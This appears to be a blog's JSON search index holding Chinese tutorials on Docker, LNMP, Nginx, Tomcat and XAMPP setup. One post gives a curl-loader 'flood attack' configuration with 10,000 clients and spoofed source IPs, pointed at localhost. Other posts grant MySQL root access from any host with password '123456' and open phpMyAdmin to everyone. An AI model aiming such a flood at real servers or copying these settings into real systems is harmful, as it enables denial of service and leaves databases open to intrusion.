{"meta":{"title":"fengchuiguo","subtitle":"","description":"","author":"fengchuiguo","url":"http://zwjsfdbb.top","root":"/"},"pages":[{"title":"友情链接","date":"2023-07-05T13:32:24.000Z","updated":"2023-07-05T13:33:41.728Z","comments":true,"path":"link/index.html","permalink":"http://zwjsfdbb.top/link/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-07-05T13:31:53.000Z","updated":"2023-07-05T13:33:36.598Z","comments":true,"path":"categories/index.html","permalink":"http://zwjsfdbb.top/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-07-05T13:31:10.000Z","updated":"2023-07-05T13:33:28.461Z","comments":true,"path":"tags/index.html","permalink":"http://zwjsfdbb.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Curl_loader 泛洪攻击","slug":"curl_loader泛洪攻击","date":"2023-07-19T16:00:00.000Z","updated":"2023-07-22T02:56:57.740Z","comments":true,"path":"2023/07/20/curl_loader泛洪攻击/","link":"","permalink":"http://zwjsfdbb.top/2023/07/20/curl_loader%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB/","excerpt":"1、安装过程 下载链接 ：https://master.dl.sourceforge.net/project/curl-loader/curl-loader/curl-loader-0.56/curl-loader-0.56.tar.bz2?viasf=1 安装依赖 12yum install openssl -yyum install openssl-devel -y 解压并make 123tar -xjf curl-loader-0.56.tar.bz2cd curl-loader-0.56make 2、使用步骤 配置文件 示例 参考链接：https://curl-loader.sourceforge.net/doc/faq.html 12345678910111213141516171819202110k.conf########### GENERAL SECTION ################################BATCH_NAME= 10K # 名称CLIENTS_NUM_MAX=10000 # 最大一万个客户端CLIENTS_NUM_START=100 # 从100个客户端开始CLIENTS_RAMPUP_INC=50 # 每次增加50INTERFACE =eth0 # 网卡NETMASK=16 # 掩码IP_ADDR_MIN= 192.168.1.1 # 伪装的IP起始IP_ADDR_MAX= 192.168.53.255 #Actually - this is for self-controlCYCLES_NUM= -1 # 循环次数 -1代表无限循环URLS_NUM= 1 # URL的数量########### URL SECTION ####################################URL=http://localhost/index.html#URL=http://localhost/ACE-INSTALL.htmlURL_SHORT_NAME=&quot;local-index&quot;REQUEST_TYPE=GETTIMER_URL_COMPLETION = 5000 # In msec. When positive, Now it is enforced by cancelling url fetch on timeoutTIMER_AFTER_URL_SLEEP =20 # 请求发的间歇 使用命令","text":"1、安装过程 下载链接 ：https://master.dl.sourceforge.net/project/curl-loader/curl-loader/curl-loader-0.56/curl-loader-0.56.tar.bz2?viasf=1 安装依赖 12yum install openssl -yyum install openssl-devel -y 解压并make 123tar -xjf curl-loader-0.56.tar.bz2cd curl-loader-0.56make 2、使用步骤 配置文件 示例 参考链接：https://curl-loader.sourceforge.net/doc/faq.html 12345678910111213141516171819202110k.conf########### GENERAL SECTION ################################BATCH_NAME= 10K # 名称CLIENTS_NUM_MAX=10000 # 最大一万个客户端CLIENTS_NUM_START=100 # 从100个客户端开始CLIENTS_RAMPUP_INC=50 # 每次增加50INTERFACE =eth0 # 网卡NETMASK=16 # 掩码IP_ADDR_MIN= 192.168.1.1 # 伪装的IP起始IP_ADDR_MAX= 192.168.53.255 #Actually - this is for self-controlCYCLES_NUM= -1 # 循环次数 -1代表无限循环URLS_NUM= 1 # URL的数量########### URL SECTION ####################################URL=http://localhost/index.html#URL=http://localhost/ACE-INSTALL.htmlURL_SHORT_NAME=&quot;local-index&quot;REQUEST_TYPE=GETTIMER_URL_COMPLETION = 5000 # In msec. When positive, Now it is enforced by cancelling url fetch on timeoutTIMER_AFTER_URL_SLEEP =20 # 请求发的间歇 使用命令 1./curl-loader -f test.conf","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://zwjsfdbb.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Docker环境","slug":"Docker环境","date":"2023-07-12T16:00:00.000Z","updated":"2023-07-18T14:28:50.554Z","comments":true,"path":"2023/07/13/Docker环境/","link":"","permalink":"http://zwjsfdbb.top/2023/07/13/Docker%E7%8E%AF%E5%A2%83/","excerpt":"1、Docker基本概念一个非常轻量级的虚拟环境，没有独立IP，依赖于宿主机。 Docker之间可以互相通信。外部设备无法访问Docker，必须把端口映射给宿主机。 注意事项： 尽量让一个容器做一件事情 尽量使用挂载的方式把数据文件挂载到容器中 尽量不要使用交互环境来直接操作容器，而是在宿主机上执行命令。 2、Docker 环境安装123456yum install -y net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-rep http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum install -y docker-cesystemctl start docker 3、配置拉取的镜像源123456789vim/etc/docker/daemon.json 添加&#123; &quot;registry-mirrors&quot;:[ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ]&#125; 运行docker info","text":"1、Docker基本概念一个非常轻量级的虚拟环境，没有独立IP，依赖于宿主机。 Docker之间可以互相通信。外部设备无法访问Docker，必须把端口映射给宿主机。 注意事项： 尽量让一个容器做一件事情 尽量使用挂载的方式把数据文件挂载到容器中 尽量不要使用交互环境来直接操作容器，而是在宿主机上执行命令。 2、Docker 环境安装123456yum install -y net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-rep http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum install -y docker-cesystemctl start docker 3、配置拉取的镜像源123456789vim/etc/docker/daemon.json 添加&#123; &quot;registry-mirrors&quot;:[ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ]&#125; 运行docker info 4、相关官方站点https://hub.docker.com https://hub.daocloud.io/ 5、搜索和拉取镜像1234567891011121314151617181920212223242526272829# 搜索特定镜像docker search centos# 拉取特定镜像docker pull centos # 查看当前有多少镜像docker images# 创建容器 以交互式创建，映射docker里的3306到宿主机3307端口，容器名称centos_mysql,主机名 my_mysql[root@192 ~]# docker create -it --name centos_mysql -h my_mysql -p 3307:3306 centos:latestc22489a7c38c70632e117a327647278bffc332e96c8300c7fbaebcec78bff052# 查看当前容器[root@192 ~]# docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc22489a7c38c centos:latest &quot;/bin/bash&quot; 2 minutes ago Created centos_mysql# 运行[root@192 ~]# docker start centos_mysqlcentos_mysql[root@192 ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc22489a7c38c centos:latest &quot;/bin/bash&quot; 4 minutes ago Up 3 seconds 0.0.0.0:3307-&gt;3306/tcp, :::3307-&gt;3306/tcp centos_mysql# 执行[root@192 ~]# docker exec -it centos_mysql /bin/bash[root@my_mysql /]# # 创建并运行docker run -it --name centos_mysql -h my_mysql -p 3307:3306 centos:latest# 特权模式下创建容器docker create -ti --name centos_mysql --privileged=true -h my_mysql -p 3307:3306 centos:latest /sbin/init 失败的情况 ​ 查看docker 中yum 源，发现yum list 失败， 1234[root@my_mysql /]# yum listFailed to set locale, defaulting to C.UTF-8CentOS Linux 8 - AppStream 66 B/s | 38 B 00:00 Error: Failed to download metadata for repo &#x27;appstream&#x27;: Cannot prepare internal mirrorlist: No URLs in mirrorlist ​ 可以运行以下命令 1234cd /etc/yum.repos.d/sed -i &#x27;s/mirrorlist/#mirrorlist/g&#x27; /etc/yum.repos.d/CentOS-*sed -i &#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27; /etc/yum.repos.d/CentOS-*yum update -y 6、示例安装 Tomcat + Mysql 服务 安装Mydql 123456789101112131415161718192021# 拉取centos7镜像docker pull couchbase/centos7-systemd# 以特权模式创建容器，可以使用systemctldocker create -ti --name centos_7 --privileged=true -h my_mysql -p 3307:3306 couchbase/centos7-systemd /sbin/init# 进入到容器docker exec -it centos_7 /bin/bash# 下载mysql的rpmwget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm# 安装源rpm ivh mysql57-community-release-el7-11.noarch.rpm # 编辑源，启用mysql5.6 enabled=1 取消mysql5.7vim /etc/yum.repos.d/mysql-community.repo # 安装mysql5.6yum install mysql-serversystemctl start mysqld# 创建远程登录用户mysql -urootGRANT ALL PRIVILEGES ON *.* TO &#x27;client&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;flush privileges;systemctl restart mysqld;# 此时可以用navicat 连接宿主机3307端口即为连接到docker 容器的3306端口，即mysql服务。 安装java1.8 12345678#拷贝到docker docker cp jdk1.8.0_211.tar.gz centos_7:/opttar -xzf jdk1.8.0_211.tar.gz编辑 ~/.bash_profileexport JAVA_HOME=/opt/jdk1.8.0_211PATH=$PATH:$HOME/bin:$JAVA_HOME/bin# 生效source .bash_profile 安装Tomcat 1234567891011docker cp ./apache-tomcat-8.5.90.tar.gz centos_7:/optcd /opttar xzvf apache-tomcat-8.5.90.tar.gzecho &#x27;export CATALINA_HOME=/opt/apache-tomcat-8.5.90&#x27; &gt;&gt; ~/.bashrcecho &#x27;export PATH=$CATALINA_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrcsource ~/.bashrc# 防火墙firewall-cmd --add-port=8080/tcp --permanent# 启动$CATALINA_HOME/bin/startup.sh 修改数据库连接，复制站点等 7、镜像保存、归档、压缩、还原1234567# 镜像保存docker commit -a &quot;author&quot; -m &quot;description&quot; 容器名称（centos_7） 镜像名字# 归档、压缩docker save -o /opt/xxx.tar 镜像名字gzip xxx.tar# 还原docker load -i xxx.tar.gz 8、挂载12# 创建容器的时候，-v 选项指定挂载的目录，修改宿主机的文件即为修改容器里面的文件docker create -it -name xxx -v /opt/xxx:/opt/xxx 镜像名 8、注意事项 docker stop 以后 再启动 .bash_profile 未生效，因此可以将一些命令写入到 &#x2F;etc&#x2F;bashrc 或者 ~&#x2F;.bashrc，或者直接写入&#x2F;etc&#x2F;rc.d&#x2F;rc.local ，可以实现在docker 启动时就执行 123456/etc/rc.d/rc.local 系统启动时执行 /etc/rc.local 是其软连接文件/etc/profile 登录时执行/etc/bashrc 运行bash shell时执行~/.bash_profile 用户登陆时执行~/.bashrc 用户登陆以及打开bash shell 时执行~/.bash_logout 用户退出登录时执行 9、dockfile 构建镜像DockerFile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。 全自动化的拉取镜像，执行一系列指令，从而生成对应的镜像。","categories":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/tags/web/"}]},{"title":"LNMP环境（支持LUA）","slug":"LNMP环境安装","date":"2023-07-10T16:00:00.000Z","updated":"2023-07-10T14:27:42.103Z","comments":true,"path":"2023/07/11/LNMP环境安装/","link":"","permalink":"http://zwjsfdbb.top/2023/07/11/LNMP%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/","excerpt":"1、安装Mysql5.7 配置Mysql 的yum 源 CentOS 的yum源中没有mysql，需要到mysql的官网下载yum repo配置文件 12345678910111213141516# 下载安装wget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpmrpm -ivh mysql57-community-release-el7-11.noarch.rpm rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022yum -y install mysql-server# 查看mysqld 服务是否存在并启动systemctl start mysqlsystemctl status mysqld# 获取临时密码（mysql5.7才有，5.6默认密码为空）cat /var/log/mysqld.log |grep password2023-07-06T14:49:50.366809Z 1 [Note] A temporary password is generated for root@localhost: wF4t6oiiju)o# 更改密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Qwer1234@&#x27;; 查看默认密码策略 如需关闭密码策略，在&#x2F;etc&#x2F;my.cnf 中添加 validate_password&#x3D; off 创建数据库和账号 12345678910111213141516171819202122232425# 创建数据库mysql&gt; create database web_site character set utf8 collate utf8_general_ci;Query OK, 1 row affected (0.00 sec)# 创建用户mysql&gt; create user john@&#x27;%&#x27; identified by &#x27;Asdf1234@&#x27;;Query OK, 0 rows affected (0.00 sec)# 授权用户用于该数据库的所有表的权限mysql&gt; grant all privileges on web_site.* to john@&#x27;%&#x27;;Query OK, 0 rows affected (0.00 sec)# 查看用户是否添加成功mysql&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; select User,Host,authentication_string from user;+---------------+-----------+-------------------------------------------+| User | Host | authentication_string |+---------------+-----------+-------------------------------------------+| root | localhost | *F393111FF4D128DBA783646EDBD577DC15DEBE40 || mysql.session | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || mysql.sys | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || john | % | *C244E5730489A669785440CA0861C36379D08029 |+---------------+-----------+-------------------------------------------+4 rows in set (0.00 sec) 2、php7.3 源码安装 安装依赖库 1234567891011yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel freetype-devel libxml2-devel libjpeg-devel libpng-devel curl-devel patch ncurses-devel bzip2 libcap-devel ntp diffutils sendmail iptables unzip cmake pcre-devel zlib-devel openssl openssl-devel libmcrypt-devel libmhash-devel sysklogd# 其中libmcrypt-devel libmhash-devel 安装失败解决办法1、安装第三方yum源wget http://www.atomicorp.com/installers/atomicsh ./atomic2、使用yum命令安装yum install libmcrypt-devel libmhash-devel# sysklogd 安装失败，说是在较新的 Linux 发行版中，rsyslog 已经取代了 sysklogd，就没管了 创建用户和组 12[root@192 ~]# groupadd www[root@192 ~]# useradd -r www -g www 安装","text":"1、安装Mysql5.7 配置Mysql 的yum 源 CentOS 的yum源中没有mysql，需要到mysql的官网下载yum repo配置文件 12345678910111213141516# 下载安装wget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpmrpm -ivh mysql57-community-release-el7-11.noarch.rpm rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022yum -y install mysql-server# 查看mysqld 服务是否存在并启动systemctl start mysqlsystemctl status mysqld# 获取临时密码（mysql5.7才有，5.6默认密码为空）cat /var/log/mysqld.log |grep password2023-07-06T14:49:50.366809Z 1 [Note] A temporary password is generated for root@localhost: wF4t6oiiju)o# 更改密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;Qwer1234@&#x27;; 查看默认密码策略 如需关闭密码策略，在&#x2F;etc&#x2F;my.cnf 中添加 validate_password&#x3D; off 创建数据库和账号 12345678910111213141516171819202122232425# 创建数据库mysql&gt; create database web_site character set utf8 collate utf8_general_ci;Query OK, 1 row affected (0.00 sec)# 创建用户mysql&gt; create user john@&#x27;%&#x27; identified by &#x27;Asdf1234@&#x27;;Query OK, 0 rows affected (0.00 sec)# 授权用户用于该数据库的所有表的权限mysql&gt; grant all privileges on web_site.* to john@&#x27;%&#x27;;Query OK, 0 rows affected (0.00 sec)# 查看用户是否添加成功mysql&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; select User,Host,authentication_string from user;+---------------+-----------+-------------------------------------------+| User | Host | authentication_string |+---------------+-----------+-------------------------------------------+| root | localhost | *F393111FF4D128DBA783646EDBD577DC15DEBE40 || mysql.session | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || mysql.sys | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE || john | % | *C244E5730489A669785440CA0861C36379D08029 |+---------------+-----------+-------------------------------------------+4 rows in set (0.00 sec) 2、php7.3 源码安装 安装依赖库 1234567891011yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel freetype-devel libxml2-devel libjpeg-devel libpng-devel curl-devel patch ncurses-devel bzip2 libcap-devel ntp diffutils sendmail iptables unzip cmake pcre-devel zlib-devel openssl openssl-devel libmcrypt-devel libmhash-devel sysklogd# 其中libmcrypt-devel libmhash-devel 安装失败解决办法1、安装第三方yum源wget http://www.atomicorp.com/installers/atomicsh ./atomic2、使用yum命令安装yum install libmcrypt-devel libmhash-devel# sysklogd 安装失败，说是在较新的 Linux 发行版中，rsyslog 已经取代了 sysklogd，就没管了 创建用户和组 12[root@192 ~]# groupadd www[root@192 ~]# useradd -r www -g www 安装 1234./configure --prefix=/usr/local/php --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-openssl --with-libxml-dir --with-zlib --enable-mbstring --with-mysqli=mysqlnd --enable-mysqlnd --with-pdo-mysql=mysqlnd --with-gd --with-jpeg-dir --with-png-dir --with-zlib-dir --with-freetype-dir --enable-sockets --with-curl --enable-maintainer-zts make make install 配置PHP环境 1234567891011cd /usr/local/php/cp etc/php-fpm.conf.default etc/php-fpm.confcp etc/php-fpm.d/www.conf.default etc/php-fpm.d/www.confcp /root/php-7.3.32/php.ini-production lib/php.ini/usr/local/php/sbin/php-fpm [root@192 php]# netstat -anpltActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:9000 0.0.0.0:* LISTEN 110017/php-fpm: mas 开启php-fp, 启动9000进行监听，获取从Nignx发送过来的处理请求。 3、安装Nginx（支持LUA）（注意各个版本，所使用的版本不同可能最后编译失败） 安装LuaJIT 12345cd /opt/wget http://luajit.org/download/LuaJIT-2.0.5.tar.gztar -zxf LuaJIT-2.0.5.tar.gz cd LuaJIT-2.0.5/make &amp;&amp; make install 安装ngx_devel_kit 12345#下载链接https://github.com/vision5/ngx_devel_kit/archive/refs/tags/v0.3.2.tar.gz拷贝到/opt 目录cd /opttar -zxvf ngx_devel_kit-0.3.2.tar.gz 安装nginx_lua_module 12345# 下载链接https://github.com/openresty/lua-nginx-module/archive/refs/tags/v0.10.13.tar.gz拷贝到/opt目录cd /opttar -zxf lua-nginx-module-0.10.13.tar.gz 导入环境变量 1234vim /etc/profile# 添加到末尾export LUAJIT_LIB=/usr/local/libexport LUAJIT_INC=/usr/local/include/luajit-2.0 安装nginx 123456tar -zxf nginx-1.22.1.tar.gz cd nginx-1.22.1/./configure --user=www --group=www --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --pid-path=/usr/local/nginx/nginx.pid --with-http_realip_module --add-module=/opt/ngx_devel_kit-0.3.2 --add-module=/opt/lua-nginx-module-0.10.13 --with-ld-opt=&quot;-Wl,-rpath,$LUAJIT_LIB&quot;make -j2 &amp;&amp; make installfirewall-cmd --add-port=80/tcp --permanent/usr/local/nginx/sbin/nginx 环境安装基本结束 4、配置站点 1、创建文件夹存放站点 2、递归修改所有的目录所有者,文件所有者为www 3、修改数据库连接信息 4、修改nginx.conf ，配置网站根目录，取消location 注释等，根据实际情况修改。 5、配置thinkphp的URL地址重写，修改nginx.conf 。","categories":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/tags/web/"}]},{"title":"Nginx","slug":"Nginx_new","date":"2023-07-02T16:00:00.000Z","updated":"2023-07-27T14:36:40.719Z","comments":true,"path":"2023/07/03/Nginx_new/","link":"","permalink":"http://zwjsfdbb.top/2023/07/03/Nginx_new/","excerpt":"Nginx 1、概念 轻量应用服务器、高并发 2、反向代理与正向代理 正向代理示意图 作用： 访问无法访问的资源如Google 做缓存，加速访问资源，如CDN 对客户端进行访问授权，上网认证 记录用户访问记录，上网行为管理 反向代理","text":"Nginx 1、概念 轻量应用服务器、高并发 2、反向代理与正向代理 正向代理示意图 作用： 访问无法访问的资源如Google 做缓存，加速访问资源，如CDN 对客户端进行访问授权，上网认证 记录用户访问记录，上网行为管理 反向代理 保证内网的安全，阻止web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网 负载均衡，通过反向代理来优化网站的负载 故障转移 3、安装 12345678910wget http://nginx.org/download/nginx-1.25.1.tar.gztar -zxvf nginx-1.25.1.tar.gz cd nginx-1.25.1/yum -y install gcc pcre-devel zlib-devel openssl openssl-devel./configure --prefix=/usr/local/nginx --with-http_ssl_modulemakemake install[root@192 nginx-1.25.1]# whereis nginxnginx: /usr/local/nginx/usr/local/nginx/sbin/nginx 4、nginx 连接Tomcat (单节点配置) 正常站点还要添加另一个location 1234location /website/&#123; proxy_pass http:mytomcat/website/; proxy_redirect default;&#125; 此时访问 http://192.168.101.10:80（nginx） 即为访问http://192.168.101.10:8080（Tomcat） 多节点新增Server即可。增加ip_hash ;保证同一个IP只分配同一个节点。 123456upstream mytomcat&#123; ip_hash ; # 指定Tomcat的服务器IP地址 端口以及权重 server 192.168.101.10:8080 weight=1; server 192.168.101.11:8080 weight=1; &#125;","categories":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/tags/web/"}]},{"title":"Java_Tomcat环境","slug":"Java_Tomcat环境_new","date":"2023-06-26T16:00:00.000Z","updated":"2023-07-27T14:36:20.785Z","comments":true,"path":"2023/06/27/Java_Tomcat环境_new/","link":"","permalink":"http://zwjsfdbb.top/2023/06/27/Java_Tomcat%E7%8E%AF%E5%A2%83_new/","excerpt":"Java_Tomcat环境Tomcat 核心功能是作为Java的容器来运行Java的后台代码，并内置对HTTP请求的处理，但不是最优选择，前面往往加一个Apache或者Nigix 处理HTTP请求。 1、 单独安装Mysql5.6环境 123456789101112131415161718192021222324wget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpmyum list installed | grep mysqlrpm -qa|grep -i mariadbrpm -qa|grep mariadb|xargs rpm -e --nodepsrpm -qa|grep -i mariadbrpm -ivh mysql-community-release-el6-5.noarch.rpmyum repolist all | grep mysqlyum install mysql-community-serversystemctl status mysqldsystemctl start mysqldsystemctl status mysqldmysql -uroot use mysql; UPDATE user SET Password=PASSWORD(&#x27;123456&#x27;) WHERE User=&#x27;root&#x27;; GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges;systectl restart mysqld# 如果不小心改错了,以不验证模式启动Mysqlsystemctl stop mysqldmysqld_safe --skip-grant-tables 随后登录，更改 2 .安装Tomcat 8.5 (java 已安装) 下载链接 https://tomcat.apache.org/download-80.cgi 12345678910111213141516171819tar xzvf apache-tomcat-8.5.90.tar.gzmv apache-tomcat-8.5.90 /optecho &#x27;export CATALINA_HOME=/opt/apache-tomcat-8.5.90&#x27; &gt;&gt; ~/.bashrcecho &#x27;export PATH=$CATALINA_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrcsource ~/.bashrc# 防火墙firewall-cmd --add-port=8080/tcp --permanent# 启动$CATALINA_HOME/bin/startup.sh# 默认配置文件/opt/apache-tomcat-8.5.90/conf/server.xml#默认日志文件/opt/apache-tomcat-8.5.90/log/catalina.out#访问日志文件/opt/apache-tomcat-8.5.90/log/localhost_access_log.2023-06-27.txt 默认网站根目录如下 数据库连接文件","text":"Java_Tomcat环境Tomcat 核心功能是作为Java的容器来运行Java的后台代码，并内置对HTTP请求的处理，但不是最优选择，前面往往加一个Apache或者Nigix 处理HTTP请求。 1、 单独安装Mysql5.6环境 123456789101112131415161718192021222324wget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpmyum list installed | grep mysqlrpm -qa|grep -i mariadbrpm -qa|grep mariadb|xargs rpm -e --nodepsrpm -qa|grep -i mariadbrpm -ivh mysql-community-release-el6-5.noarch.rpmyum repolist all | grep mysqlyum install mysql-community-serversystemctl status mysqldsystemctl start mysqldsystemctl status mysqldmysql -uroot use mysql; UPDATE user SET Password=PASSWORD(&#x27;123456&#x27;) WHERE User=&#x27;root&#x27;; GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges;systectl restart mysqld# 如果不小心改错了,以不验证模式启动Mysqlsystemctl stop mysqldmysqld_safe --skip-grant-tables 随后登录，更改 2 .安装Tomcat 8.5 (java 已安装) 下载链接 https://tomcat.apache.org/download-80.cgi 12345678910111213141516171819tar xzvf apache-tomcat-8.5.90.tar.gzmv apache-tomcat-8.5.90 /optecho &#x27;export CATALINA_HOME=/opt/apache-tomcat-8.5.90&#x27; &gt;&gt; ~/.bashrcecho &#x27;export PATH=$CATALINA_HOME/bin:$PATH&#x27; &gt;&gt; ~/.bashrcsource ~/.bashrc# 防火墙firewall-cmd --add-port=8080/tcp --permanent# 启动$CATALINA_HOME/bin/startup.sh# 默认配置文件/opt/apache-tomcat-8.5.90/conf/server.xml#默认日志文件/opt/apache-tomcat-8.5.90/log/catalina.out#访问日志文件/opt/apache-tomcat-8.5.90/log/localhost_access_log.2023-06-27.txt 默认网站根目录如下 数据库连接文件 修改对应的网站的数据库连接情况，导入数据库， 3、配置HTTPS 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849[root@192 apache-tomcat-8.5.90]# keytool -genkeypair -alias &quot;tomcat&quot; -keyalg &quot;RSA&quot; -keystore &quot;/opt/tomcat.keystore&quot;Enter keystore password: Re-enter new password: What is your first and last name? [Unknown]: jieWhat is the name of your organizational unit? [Unknown]: 360What is the name of your organization? [Unknown]: 360What is the name of your City or Locality? [Unknown]: chengduWhat is the name of your State or Province? [Unknown]: sichuanWhat is the two-letter country code for this unit? [Unknown]: cnIs CN=jie, OU=360, O=360, L=chengdu, ST=sichuan, C=cn correct? [no]: yesEnter key password for &lt;tomcat&gt; (RETURN if same as keystore password): Re-enter new password: Warning:The JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using &quot;keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12&quot;.[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12&quot;&gt; ^C[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12Enter source keystore password: Entry for alias tomcat successfully imported.Import command completed: 1 entries successfully imported, 0 entries failed or cancelledWarning:Migrated &quot;/opt/tomcat.keystore&quot; to Non JKS/JCEKS. The JKS keystore is backed up as &quot;/opt/tomcat.keystore.old&quot;.接着更改配置文件conf/server.xml &lt;Connector port=&quot;8443&quot; protocol=&quot;org.apache.coyote.http11.Http11NioProtocol&quot; maxThreads=&quot;150&quot; SSLEnabled=&quot;true&quot; maxParameterCount=&quot;1000&quot; keystoreFile=&quot;/opt/tomcat.keystore&quot; keystorePass=&quot;123456&quot; &gt; &lt;SSLHostConfig&gt; &lt;Certificate certificateKeystoreFile=&quot;conf/localhost-rsa.jks&quot; type=&quot;RSA&quot; /&gt; &lt;/SSLHostConfig&gt; &lt;/Connector&gt;","categories":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://zwjsfdbb.top/tags/web/"}]},{"title":"LAMP环境","slug":"LAMP环境_new","date":"2023-06-23T16:00:00.000Z","updated":"2023-07-27T14:36:07.858Z","comments":true,"path":"2023/06/24/LAMP环境_new/","link":"","permalink":"http://zwjsfdbb.top/2023/06/24/LAMP%E7%8E%AF%E5%A2%83_new/","excerpt":"Lampp环境1、基本概念与环境 Linux+apache2+mysql+php+python Xmapp 是集合了LAMPP 的完整的运行环境，相对来说适用于开发和调试，但是安全性配置不足，相对而言漏洞较多。 Xmapp 启动后，Apache 使用端口80，防火墙要放行 1firewall-cmd --add-port=80/tcp --permanant http://ip/dashboard/phpinfo.php 展示了所有运行环境参数，通常情况下，配置完成后要删除该页面 默认情况下，&#x2F;opt&#x2F;lampp&#x2F;htdocs 目录是应用程序的根目录。 phpmyadmin 是mysql的网页端，默认情况下禁止远程访问 123456789# 修改/opt/lampp/etc/extra/httpd-xampp.conf # 注释 Require local 新增 Require all granted 即可运行远程访问# since XAMPP 1.4.3&lt;Directory &quot;/opt/lampp/phpmyadmin&quot;&gt; AllowOverride AuthConfig Limit # Require local Require all granted ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var&lt;/Directory&gt; 确认服务和端口正常启动 修改默认端口，修改配置文件&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf，改成非80，更安全 如果出现内核版本不兼容情况，修改&#x2F;opt&#x2F;lampp&#x2F;lampp ，将内核版本修改为2.8.0以上。 1LD_ASSUME_KERNEL=2.8.0 部署对应的系统或者网站，导入数据库，修改配置文件等。 注意配置数据库时 修改root默认密码 配置phpmyadmin 允许远程访问，或者设置一个可以远程访问的用户，然后用navicat连接进行配置 123456789101112131415161718默认数据库的user情况MariaDB [mysql]&gt; select User,Password,Host from user;+------+----------+-----------+| User | Password | Host |+------+----------+-----------+| root | | localhost || root | | 127.0.0.1 || root | | ::1 || | | localhost || root | | % || pma | | localhost第一行：用户名为 root，密码为空白，允许从 localhost 发起连接请求，不需要密码。第二行：用户名为 root，密码为空白，允许从 127.0.0.1 发起连接请求，不需要密码。第三行：用户名为 root，密码为空白，允许从 ::1 发起连接请求，不需要密码。第四行：用户名为空白，密码为空白，允许从 localhost 发起连接请求。这行数据有些特殊，因为它可以允许任何人以匿名身份登录，不需要密码。第五行：用户名为 root，密码为空白，允许从任意主机（%）发起连接请求。注意，在使用通配符 % 时需要小心，因为这样很可能导致安全漏洞，不需要密码。第六行：用户名为 pma，密码为空白，允许从 localhost 发起连接请求。pma 是 phpMyAdmin 中默认创建的一个用户，用于管理 MySQL 